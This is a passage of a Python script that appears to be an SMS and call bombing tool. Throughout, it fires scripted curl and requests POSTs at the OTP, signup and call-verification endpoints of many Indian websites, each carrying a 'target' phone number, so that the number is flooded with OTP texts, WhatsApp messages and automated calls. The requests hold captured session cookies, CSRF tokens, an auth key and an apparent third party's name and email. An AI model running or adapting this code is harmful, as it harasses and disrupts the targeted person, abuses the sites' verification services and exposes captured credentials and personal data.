    curl -X POST -H "Host:webapi.gradeup.co" -H "content-length:61" -H "accept:application/json; charset=utf-8" -H "origin:https://gradeup.co" -H "content-type:application/json; charset=utf-8" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "devicetype:web" -H "referer:https://gradeup.co/online-test-series-ssc-cgl?openLogin=y" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:WZRK_S_RZZ-649-9W5Z=%7B%22p%22%3A1%2C%22s%22%3A1616180089%2C%22t%22%3A1616180208%7D" -H "cookie:WZRK_G=54e3f9d611414cd9b7ae3b217518fa99" -H "cookie:_ga=GA1.1.76284556.1616180012" -H "cookie:_ga_K9EXG17XMV=GS1.1.1616180084.1.0.1616180084.0" -H "cookie:_fbp=fb.1.1616180085448.1043568815" -H "cookie:_gid=GA1.2.338161445.1616180012" -H "cookie:cookieGroup=0a1238ce-a25e-11e5-b319-9ea29fdd41f8" -H "cookie:cookieCategory=e9c196a1-4ae6-11e5-bc68-8620ffdeb79c" -H "cookie:cCategoryId=e9c196a1-4ae6-11e5-bc68-8620ffdeb79c" -H "cookie:_gcl_au=1.1.1511191945.1616180011" -H "cookie:g-theme=LIGHT" -H "cookie:__cfduid=d1f022fefeea606152b151ff1bcf912461616179951" -d '{"tel":"+91'''+target+'''","viaWhatsapp":true,"deviceType":"web"}' "https://webapi.gradeup.co/user/verify/sendOtp" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.1mg.com" -H "content-length:68" -H "x-html-canrender:True" -H "pragma:no-cache" -H "hkp-platform:Healthkartplus-0.0.1-mobileweb" -H "x-csrf-token:MDLM2Mw0-_cJEPJkZwVNXP60KWKkwbOMcd8E" -H "x-platform:mobileweb-0.0.1" -H "visitor-id:943b5a7a-98a5-4671-c637-90b72cd27dcc_acce55_1616133815" -H "content-type:application/json" -H "accept:application/vnd.healthkartplus.v11+json" -H "cache-control:no-cache, no-store, must-revalidate" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "origin:https://www.1mg.com" -H "referer:https://www.1mg.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gat=1" -H "cookie:_gat_UA-21820217-6=1" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:__gads=ID=49afeaab6934ccdd:T=1616133829:S=ALNI_MayOmW0puejFnnAHqBtoTtgcSTiLw" -H "cookie:lt_synch_timestamp=RudderEncrypt%3AU2FsdGVkX1%2FD31DiOFWBetx9EnByunHmcfE0Ni4wi0Y%3D" -H "cookie:_gcl_au=1.1.169833827.1616133828" -H "cookie:_gid=GA1.2.2091105844.1616133828" -H "cookie:_ga=GA1.2.1236928672.1616133828" -H "cookie:_uetvid=dda6d5f0887811eb833aad7ded4338e6" -H "cookie:_uetsid=dda54320887811ebbe72551805a24e27" -H "cookie:rl_trait=RudderEncrypt%3AU2FsdGVkX19ijzixNrW2gztiSGz%2B9LdA3IaY0PmjJeCTbVANhdXY6bK%2B8VzN9YLpAIz5Re6O4xqtMRzSjocnPg%3D%3D" -H "cookie:rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BeVFVkw9su1nUg0oDb2qb00lLF54Fz%2FwX4tJPqZGRQoNfuWeWb2Zv9shPMxvUNk3AhkCXTJfz37qwLjwisRZv3cWdSpXpfUVc%3D" -H "cookie:rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX1%2FJHBmIPZFvNCYxn%2Bbd8js58Eix29SmgzthUIgi9X7ReVobo5bvMyhIRGvX2uUvj%2BdWAGBfXn46qA%3D%3D" -H "cookie:rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FInG90S7EqvNai2IN9XVGlccl3q8x%2FQMicY8ASe%2BCsaP7WDmDogQIeCjnMIMkvP8ujRipbzIKmjTh%2FuOo0shAuFQMpBU5%2FlPl9L32O2%2Bp%2BtfiWa7DeebD0OmFUIpBHqXAzihUGG1%2FpsNLfhUxhr62uaIbAV%2B7ePKA%3D" -H "cookie:rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2B8iYRamIuAbjkUd4V8bPxyPEAKkHXFEWQ%3D" -H "cookie:rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2BPG%2Bx0wsYANK2Pjf8hV21WqtkbKcMhg20%3D" -H "cookie:rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX188MPYerV4tK2Ci53XvddApXxvLo8AAoCYgswGTkNt0vh9sauX4HJxWukKvsrLW%2FiSSThdA3cMJFQ%3D%3D" -H "cookie:session=_VjnEM2S6Lc0rhkxPNqyLA.LDa84sSEwGj0SMu1nwhKgt982xVBApRNAhvVm_ZcnW5An-XNGn8Q3j79B7MTu0ymIUXFauBFuTo36MRJ8zp1PDs4na1RcUIv6q0lgg0LjJbA7dRIQ8g7qGwmMt2NulU0bMXrKW0Y0FdU5d69iEv_tQ.1616133823362.2592000000.V7OupvADscMyR84vM3XtkZkPe-MET8UXxtYI679g6-A" -H "cookie:geolocation=false" -H "cookie:_fbp=fb.1.1616133817973.953661193" -H "cookie:isLocaleUIChange=false" -H "cookie:isLocaleRedirect=false" -H "cookie:_csrf=Ttb2QR8pJU0ksy564C9G2bzL" -H "cookie:amoSessionId=03789748-65f3-48ba-a4ea-675a4fc9d394" -H "cookie:abExperimentShow=true" -H "cookie:abVisitorId=425969" -H "cookie:city=New%20Delhi" -H "cookie:VISITOR-ID=943b5a7a-98a5-4671-c637-90b72cd27dcc_acce55_1616133815" -H "cookie:__cfduid=dc218313a75476ae19bc4b9b96a07d5401616133815" -d '{"number":"'''+target+'''","is_corporate_user":false,"otp_on_call":true}' "https://www.1mg.com/pharmacy_api_gateway/v4/otp_call" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.nykaafashion.com" -H "content-length:32" -H "cache-control:max-age=0" -H "origin:https://www.nykaafashion.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.nykaafashion.com/authorization?authPage=sign-up-mobile&redirectURL=%2F" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:s_sq=fsnecommercenykaadesignstudio%3D%2526c.%2526a.%2526activitymap.%2526page%253Dnds%25253Asign_up%25253Amobile%2526link%253DSubmit%2526region%253Dapp%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dnds%25253Asign_up%25253Amobile%2526pidt%253D1%2526oid%253DfunctionWn%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT" -H "cookie:s_nr=1615398192551-New" -H "cookie:TSd06dbe12027=089189808bab2000b5dff6b4d83df89347395dc5899992e1b74c5b93acd3d19371ad8e78c8375d48082a4fdc8611300095f658c60ed749e1015cc13c32d9dbc1e529477aecad3d9c66d9fb67464936ffad3389c9793ad6eeee018948748409ec" -H "cookie:TS0120e74a=01d63715f235abd7de4d745e5d85c56871f096692ba138ec4ef174cbc71cd260165507f7ff9eca2c694604ddaaa5c55fc2269428b20f501ef06dd23c9d958504c6bed377577c10023a605e43adb59b109c004fc15fa3f435683ad9e0fc3ed74cc01e214f3455eb5b9474cf7d7d37fb318e438635ba" -H "cookie:s_cc=true" -H "cookie:AMCV_FE9A65E655E6E38A7F000101%40AdobeOrg=1075005958%7CMCIDTS%7C18697%7CMCMID%7C08645160895963750244551974281183840658%7CMCAAMLH-1616002827%7C12%7CMCAAMB-1616002827%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1615405227s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C4.4.1" -H "cookie:__stp={"visit":"new","uuid":"2b5ec130-6d45-4d76-82b0-fd6eac540628"}" -H "cookie:__sts={"sid":1615398027352,"tx":1615398027352,"url":"https%3A%2F%2Fwww.nykaafashion.com%2Fauthorization%3FauthPage%3Dsign-up-mobile%26redirectURL%3D%2F","pet":1615398027352,"set":1615398027352}" -H "cookie:AMCVS_FE9A65E655E6E38A7F000101%40AdobeOrg=1" -H "cookie:NYKAA_VP_USER={"key":28,"ruleID":"start_v2"}" -H "cookie:private_content_version=0139219f218631b8934c18dafd361c09" -H "cookie:PHPSESSID=rk3pmtebtvnf871tb54kivle62" -H "cookie:f5_cspm=1234" -H "cookie:CurrencyCode=INR" -H "cookie:countryNameFull=India" -H "cookie:countryName=IN" -H "cookie:f5_cspm=1234" -d '{"customer_mobile":"'''+target+'''"}' "https://www.nykaafashion.com/webscripts/api/otp/generate" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.aakash.ac.in" -H "content-length:21" -H "x-newrelic-id:Vg4AV1FQABAGV1NSBQkAVlw=" -H "origin:https://www.aakash.ac.in" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "accept:*/*" -H "x-requested-with:XMLHttpRequest" -H "dnt:1" -H "referer:https://www.aakash.ac.in/user/register" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_uetvid=fa9796a0295f11ebbf341d41f01775f2" -H "cookie:_uetsid=fa95ab80295f11eb84b693278bab3747" -H "cookie:AWSALBCORS=SGfGPKHN9qeg73IdpfHx6HoSNlZYoMqe28R8pi8Z8qmvxsFfob+/RfpnATXKiAT3aKgGcZBWPjUqE/Yz1uZxqTzDPdjAJoB8y9WzxKKbt1LlR+W/uXnwjMRBg9Ow" -H "cookie:AWSALB=SGfGPKHN9qeg73IdpfHx6HoSNlZYoMqe28R8pi8Z8qmvxsFfob+/RfpnATXKiAT3aKgGcZBWPjUqE/Yz1uZxqTzDPdjAJoB8y9WzxKKbt1LlR+W/uXnwjMRBg9Ow" -H "cookie:_gat_UA-30079688-1=1" -H "cookie:__zlcmid=11EjasuyYkXSPRr" -H "cookie:_fbp=fb.2.1605677779769.2005800400" -H "cookie:_hjFirstSeen=1" -H "cookie:_hjid=b3e7a079-8ba0-4747-b48f-746c45b9dfef" -H "cookie:_hjTLDTest=1" -H "cookie:_gid=GA1.3.611832579.1605677777" -H "cookie:_ga=GA1.3.1207161440.1605677777" -H "cookie:_gcl_au=1.1.2016065207.1605677776" -H "cookie:_co_session_active=1" -d '&mobileval='''+target+'''' "https://www.aakash.ac.in/signup-otp-verify" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.abhibus.com" -H "content-length:31" -H "accept:*/*" -H "origin:https://www.abhibus.com" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.abhibus.com/trains/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:bm_sv=79E363F7FF7E82E2D326B95ACCC7AC87~saWq4oHH61YROihj+mIptt88kfy5nJRnLHw5De1HN4kwuV6FkYoAYEXlTcoACTqXotPiZwC9IFdxX2b6Zq8B7cV0T4lNGAoSpqtAMpJvYPxwVixriEuVpFoxa3y0pKoCCqYrm2tFKXc6z0pR+DPKl3kAsUCbNX5lLvwgspyaa4w=" -H "cookie:ci_session=iFN%2BQVUiEfxbvV6xp12jZDhwG2Kgwmow4vg7VPZjp3pzHgECxKKuxzCjnextU97%2B7sAOu1YbQkazOYfy9kzf3s7YpcHUHAbLvpdSAhBtNnv%2BLUXPTLnrR8QYp5oTKRM3CXgAB%2BAfOjMCljltQCRbJSG8370L3epbODAnyyx5oEzUxtBU8V6kE%2FuunNCn9BLw%2FJvKGTIoy2Ku3vubTn70YAGoipG%2BWrfpDfFkJ9ti5pI%2FLANDJ%2BZ0eei12YDcRmFF2OhubHzf%2BSJLrAuM3IIYOAln3AOOcTH%2Bit5YzgawJUo5dH9CT%2FarX2fBYKWV2F2kfove1%2BwMvJ97YHAoaELL69hEtxQMqSsy0WXyE%2FJVadzp91zpvznXwGDAdKp08UAAkcTHIEn%2BEDnNOin4TPYEVm40wxyr4GkPoWLknWJOX9pHGwKr23kQNYGfizEnKjXjSDWaX0MpnWZf68b4YyKExWn62DhUG4aCIJRGOPgHvel5gTxPLkjJZ09qgLK%2F9t8xvpUmWjG5Wbljf94n5h9WIH%2B89b6LROwpsF1UVD%2F8Q5gE7O2L6sBuXMg%2FAje0rYye2mImNS%2BoeHUnRra%2BvfA%2FXA%3D%3D" -H "cookie:AWSALBCORS=klQvT9ENyCXu0HsR78S+ffcbLkTUOtxS1DqGoHzF4AqUqnud9PKoYDh2ZYmDvbRdEjj2Af2UvjReTLuacKS7wSDJZjtiRzPdjNsB7R6/dx3iaodI0QMZCj+zyvzI" -H "cookie:AWSALB=klQvT9ENyCXu0HsR78S+ffcbLkTUOtxS1DqGoHzF4AqUqnud9PKoYDh2ZYmDvbRdEjj2Af2UvjReTLuacKS7wSDJZjtiRzPdjNsB7R6/dx3iaodI0QMZCj+zyvzI" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:PHPSESSID=6h8kvsa0c56mu4t887l8mup5b1" -H "cookie:_gat_UA-6315501-20=1" -H "cookie:WZRK_S_R95-8KW-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1618044367%2C%22t%22%3A1618044366%7D" -H "cookie:WZRK_G=78f93f405c324cdb92f0098976d5af9a" -H "cookie:_gcl_au=1.1.404249058.1618044366" -H "cookie:ak_bmsc=DCEE7F3A594A6BEBFD817F6E1C8DA80717394B2C9E130000CB65716070927159~pl1XTOEnxw5pwTlXfCZVuF19KlZhZSQ49VwAo7Bcaj3hqp9n4oarrHyVVdRweEorqz77Y9PIjyPU/p5oyQxhHG7WYTpF9D32DX2sdfqPMqvmj3GZep0xlXDoe9VSx/BP2FLdNB3BbYX0dFs4NVLwEkyzEAD9Hko/Uqdbbj+fiTV9e+jO3fIwYijNqJb2VV88P5d2o/RtuG3TescEG15eUOAlKfuR93cB4y5PgjaeEH0GYPIXO9Jfvjkqz4t+ttkWEJ" -H "cookie:_gat_gtag_UA_6315501_20=1" -H "cookie:_gid=GA1.2.1172274652.1618044364" -H "cookie:_ga=GA1.2.1177967890.1618044364" -H "cookie:AKA_A2=A" -d 'mobile='''+target+'''&referralCode=' "https://www.abhibus.com/sendOtp" > /dev/null 2>&1
    ''')
    os.system('''
    curl --http2 -X POST -H "Host:grofers.com" -H "content-length:21" -H "lon:77.040489" -H "device_id:eca1f974-9468-4a0d-9a3f-cf389847a11a" -H "origin:https://grofers.com" -H "auth_key:e8d5c291c3416319fd2b053ecc0ee79af838a0f756c66102d9423f106adf2020" -H "content-type:application/x-www-form-urlencoded" -H "app_client:consumer_web" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36" -H "lat:28.4465616" -H "save-data:on" -H "accept:*/*" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-GB,en;q=0.9,en-US;q=0.8,hi;q=0.7,nl;q=0.6" -H "cookie:__cfduid=d62ea9fb03327dcae3aa1cba67e0f91301604675192" -H "cookie:gr_1_deviceId=eca1f974-9468-4a0d-9a3f-cf389847a11a" -H "cookie:city=" -H "cookie:gr_1_lat=28.4640810758775" -H "cookie:gr_1_lon=76.9942133969929" -H "cookie:gr_1_locality=1849" -H "cookie:rl_anonymous_id=%22ab624d9b-e087-411f-a8bf-f08581546149%22" -H "cookie:rl_user_id=%22%22" -H "cookie:ajs_anonymous_id=%22ce3b5e10-7c3b-4610-8303-d500457cb41e%22" -H "cookie:_gcl_au=1.1.1929301394.1604675198" -H "cookie:_uetsid=ac907fd0204111eb9262e7d445132e1e" -H "cookie:_uetvid=ac91bbd0204111ebaafb6796af997a23" -H "cookie:_ga=GA1.2.130807837.1604675201" -H "cookie:_gid=GA1.2.64916838.1604675201" -H "cookie:_gat_UA-85989319-1=1" -H "cookie:_sp_ses.bf41=*" -H "cookie:_sp_id.bf41=4dc20d20fcb0652e.1604675201.1.1604675201.1604675201.034e7d91-2e1c-4eb7-b45b-f7c9b2ee0f66" -H "cookie:WZRK_G=868a56a537564440994a9066a4c0e429" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:__insp_wid=180455199" -H "cookie:__insp_slim=1604675203427" -H "cookie:__insp_nv=true" -H "cookie:__insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS8%3D" -H "cookie:__insp_targlpt=T25saW5lIEdyb2NlcnkgU3RvcmU6IEJ1eSBPbmxpbmUgR3JvY2VyeSBmcm9tIEluZGlhJ3MgQmVzdCBPbmxpbmUgU3VwZXJtYXJrZXQgYXQgRGlzY291bnRlZCBSYXRlcyB8IEdyb2ZlcnM%3D" -H "cookie:_fbp=fb.1.1604675203579.255825096" -H "cookie:_hjid=fb662ad7-5b30-445d-899b-7e9b250c4117" -H "cookie:_hjFirstSeen=1" -H "cookie:_hjAbsoluteSessionInProgress=0" -H "cookie:__insp_norec_sess=true" -H "cookie:WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%2C%22s%22%3A1604675204%2C%22t%22%3A1604675211%7D" -H "cookie:__cfruid=0f71c77563be257eb5ad6aa54858ad4eb0b62ae4-1604675224" -d "user_phone='''+target+'''" "https://grofers.com/v2/accounts/" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:api.testbook.com" -H "content-length:289" -H "accept:application/json, text/plain, */*" -H "x-tb-client:web,1.2" -H "origin:https://testbook.com" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/json" -H "referer:https://testbook.com/login?tile=signup&modal=true&base_url=%2Flogin&redirect_url=%2Flogin" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -d '{"firstVisitSource":{"type":"typein","utm_source":"(direct)","timestamp":"2021-05-03T13:27:35.000Z","entrance":"https://testbook.com/"},"signupSource":{"type":"typein","utm_source":"(direct)","timestamp":"2021-05-03T13:27:35.000Z","entrance":"https://testbook.com/"},"mobile":"'''+target+'''"}' "https://api.testbook.com/api/v2/mobile/signup?mobile='''+target+'''" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:www.extramarks.com" -H "content-length:100" -H "accept:application/json, text/javascript, */*; q=0.01" -H "origin:https://www.extramarks.com" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.extramarks.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gat_UA-54609455-1=1" -H "cookie:_gid=GA1.2.475882287.1620237513" -H "cookie:_ga=GA1.2.931059541.1620237513" -H "cookie:_gcl_au=1.1.797622087.1620237512" -H "cookie:_fbp=fb.1.1620237504559.100126405" -H "cookie:PHPSESSID=tlfjfim9h78lcf0kj2rf2gvaq4" -d 'user_mobile='''+target+'''&otp_type=send_otp_reg&mobile_code=%2B91&display_name=Duuiutt+jutddd&email_id=' "https://www.extramarks.com/user/otpverification/'''+target+'''" > /dev/null 2>&1
    ''')
    os.system('''
    curl -X POST -H "Host:v1.titaneyeplus.com" -H "content-length:28" -H "accept:*/*" -H "origin:https://v1.titaneyeplus.com" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://v1.titaneyeplus.com/customer/account/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:AWSALBCORS=U82PUawtoCijJZOZ3cQlKrnpYfApJPp5qKkTDtyI9hpWhrzE3oaEZoiX3LDuozfeGyzKk78DzTcz0ZpbCzOCw3EjO0Z7wW8/m8wIvU2hJ8KkghxMxcFbH4FxgadB" -H "cookie:AWSALB=U82PUawtoCijJZOZ3cQlKrnpYfApJPp5qKkTDtyI9hpWhrzE3oaEZoiX3LDuozfeGyzKk78DzTcz0ZpbCzOCw3EjO0Z7wW8/m8wIvU2hJ8KkghxMxcFbH4FxgadB" -H "cookie:_ga=GA1.2.23995785.1614920381" -H "cookie:__insp_slim=1614920410564" -H "cookie:_ga_FCTC3K7Y91=GS1.1.1614920380.1.1.1614920409.0" -H "cookie:frontend=efkid2l36u2fd92ejjd082blrl" -H "cookie:__insp_norec_sess=true" -H "cookie:__insp_targlpt=RXllZ2xhc3NlcyAtIEJ1eSBFeWVnbGFzc2VzIGF0IEJlc3QgUHJpY2UgT25saW5lIHwgVGl0YW4gRXllIFBsdXM%3D" -H "cookie:__insp_targlpu=aHR0cHM6Ly93d3cudGl0YW5leWVwbHVzLmNvbS9leWVnbGFzc2VzLmh0bWw%3D" -H "cookie:__insp_nv=true" -H "cookie:__insp_wid=317686439" -H "cookie:device_type=smartphone" -H "cookie:NaN_hash=aaeebbc2TUNAEMPQ1614920387874" -H "cookie:_gat=1" -H "cookie:_gat_UA-89561937-1=1" -H "cookie:_fbp=fb.1.1614920383290.463534498" -H "cookie:_dc_gtm_UA-89561937-1=1" -H "cookie:_gid=GA1.2.576818975.1614920381" -d 'mobile='''+target+'''&otp_type=0' "https://v1.titaneyeplus.com/registerotp/index/sendotp" > /dev/null 2>&1
    ''')
    requests.post(url1,headers=headers1, data=data1)
#call
    os.system('''
    curl -X POST -H "Host:www.abhibus.com" -H "content-length:20" -H "accept:*/*" -H "origin:https://www.abhibus.com" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.abhibus.com/trains/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:bm_sv=79E363F7FF7E82E2D326B95ACCC7AC87~saWq4oHH61YROihj+mIptt88kfy5nJRnLHw5De1HN4kwuV6FkYoAYEXlTcoACTqXotPiZwC9IFdxX2b6Zq8B7cV0T4lNGAoSpqtAMpJvYPxHI4zcZhypJ0Gnx07+SauV1MU8INqlmF5JN73FvUh+9C54BezpI9hpf14joDFdOIM=" -H "cookie:AWSALBCORS=1gwQlRBmB4Loq7hhbS3zBmmeSX91W4S87rb5xTNSd/scdzV6LeK23CPd1ifFfpUD7Oia4wsRfaep8MQpoF3DnoyCImys7RWIGHYWMziF/NcEYZgOR7MMlGe6+97e" -H "cookie:AWSALB=1gwQlRBmB4Loq7hhbS3zBmmeSX91W4S87rb5xTNSd/scdzV6LeK23CPd1ifFfpUD7Oia4wsRfaep8MQpoF3DnoyCImys7RWIGHYWMziF/NcEYZgOR7MMlGe6+97e" -H "cookie:ci_session=iFN%2BQVUiEfxbvV6xp12jZDhwG2Kgwmow4vg7VPZjp3pzHgECxKKuxzCjnextU97%2B7sAOu1YbQkazOYfy9kzf3s7YpcHUHAbLvpdSAhBtNnv%2BLUXPTLnrR8QYp5oTKRM3CXgAB%2BAfOjMCljltQCRbJSG8370L3epbODAnyyx5oEzUxtBU8V6kE%2FuunNCn9BLw%2FJvKGTIoy2Ku3vubTn70YAGoipG%2BWrfpDfFkJ9ti5pI%2FLANDJ%2BZ0eei12YDcRmFF2OhubHzf%2BSJLrAuM3IIYOAln3AOOcTH%2Bit5YzgawJUo5dH9CT%2FarX2fBYKWV2F2kfove1%2BwMvJ97YHAoaELL69hEtxQMqSsy0WXyE%2FJVadzp91zpvznXwGDAdKp08UAAkcTHIEn%2BEDnNOin4TPYEVm40wxyr4GkPoWLknWJOX9pHGwKr23kQNYGfizEnKjXjSDWaX0MpnWZf68b4YyKExWn62DhUG4aCIJRGOPgHvel5gTxPLkjJZ09qgLK%2F9t8xvpUmWjG5Wbljf94n5h9WIH%2B89b6LROwpsF1UVD%2F8Q5gE7O2L6sBuXMg%2FAje0rYye2mImNS%2BoeHUnRra%2BvfA%2FXA%3D%3D" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:PHPSESSID=6h8kvsa0c56mu4t887l8mup5b1" -H "cookie:WZRK_S_R95-8KW-K75Z=%7B%22p%22%3A1%2C%22s%22%3A1618044367%2C%22t%22%3A1618044366%7D" -H "cookie:WZRK_G=78f93f405c324cdb92f0098976d5af9a" -H "cookie:_gcl_au=1.1.404249058.1618044366" -H "cookie:ak_bmsc=DCEE7F3A594A6BEBFD817F6E1C8DA80717394B2C9E130000CB65716070927159~pl1XTOEnxw5pwTlXfCZVuF19KlZhZSQ49VwAo7Bcaj3hqp9n4oarrHyVVdRweEorqz77Y9PIjyPU/p5oyQxhHG7WYTpF9D32DX2sdfqPMqvmj3GZep0xlXDoe9VSx/BP2FLdNB3BbYX0dFs4NVLwEkyzEAD9Hko/Uqdbbj+fiTV9e+jO3fIwYijNqJb2VV88P5d2o/RtuG3TescEG15eUOAlKfuR93cB4y5PgjaeEH0GYPIXO9Jfvjkqz4t+ttkWEJ" -H "cookie:_gid=GA1.2.1172274652.1618044364" -H "cookie:_ga=GA1.2.1177967890.1618044364" -H "cookie:AKA_A2=A" -d 'mobileNum='''+target+'''' "https://www.abhibus.com/otp/getOtpOnCall" > /dev/null 2>&1
    ''')
    requests.post(url3, headers=headers3, data=data3)
    os.system('''
    curl -X POST -H "Host:www.careers360.com" -H "content-length:551" -H "cache-control:max-age=0" -H "origin:https://www.careers360.com" -H "upgrade-insecure-requests:1" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "referer:https://www.careers360.com/user/register?destination=&click_location=header" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gat_UA-46098128-1=1" -H "cookie:WZRK_S_654-ZZ4-5Z5Z=%7B%22p%22%3A2%2C%22s%22%3A1615442265%2C%22t%22%3A1615442331%7D" -H "cookie:_dc_gtm_UA-46098128-1=1" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.1.1615442263972.287121379" -H "cookie:WZRK_G=11b1ac98a6434bd3bf531f8930a8b5e4" -H "cookie:__auc=4f394ef21781fdc95d395e1ab07" -H "cookie:__asc=4f394ef21781fdc95d395e1ab07" -H "cookie:_gid=GA1.2.83082818.1615442253" -H "cookie:_ga=GA1.2.1609863453.1615442253" -H "cookie:_gcl_au=1.1.2109846685.1615442253" -H "cookie:csrftoken=hGKglWYRlX4jo91hUvmvIrw8CxV72jXxUWJiq22abqj7flRawEJPr1bHBaINa5sg" -H "cookie:dataLayer_=Home Pages" -H "cookie:_omappvp=COce7fS8fP7N1342MAsnIzRKludnKoiiVsHqGHK98cpUVuP4tI6rM61yqAcAHmxjaSWTkCi1rZ8zQBp4hvT1VxLVfdPYPxPl" -d 'csrfmiddlewaretoken=K2yOPxm3HvjvyATP3zuws4xtWPYUNsPNnixQUDqmxYyjpMJIFIRQbEc2VsLAVekw&google_id=&uid=&profile_picture=&display_name=Anbhav+Kayap&email=kaubhavkshyap%40gmail.com&mobile_number='''+target+'''&current_education_level=12&current_education_passing_year=2021&school_board=&aspiring_stream=&education_stream=4&location=Bhopal%2CMadhya+Pradesh&location_id=26&source_url=https%3A%2F%2Fwww.careers360.com%2Fuser%2Fregister%3Fdestination%3D%26click_location%3Dheader&csrfmiddlewaretoken=K2yOPxm3HvjvyATP3zuws4xtWPYUNsPNnixQUDqmxYyjpMJIFIRQbEc2VsLAVekw' "https://www.careers360.com/user/register?destination=&click_location=header" > /dev/null 2>&1
    ''')
    requests.post(url1,headers=headers1, data=data1)
    os.system('''
    curl -X POST -H "Host:m.bharatmatrimony.com" -H "content-length:464" -H "cache-control:max-age=0" -H "origin:https://m.bharatmatrimony.com" -H "upgrade-insecure-requests:1" -H "dnt:1" -H "content-type:application/x-www-form-urlencoded" -H "user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "referer:https://m.bharatmatrimony.com/mobwap/registration/register-tracky.php" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en,hi;q=0.9" -H "cookie:_gat=1" -H 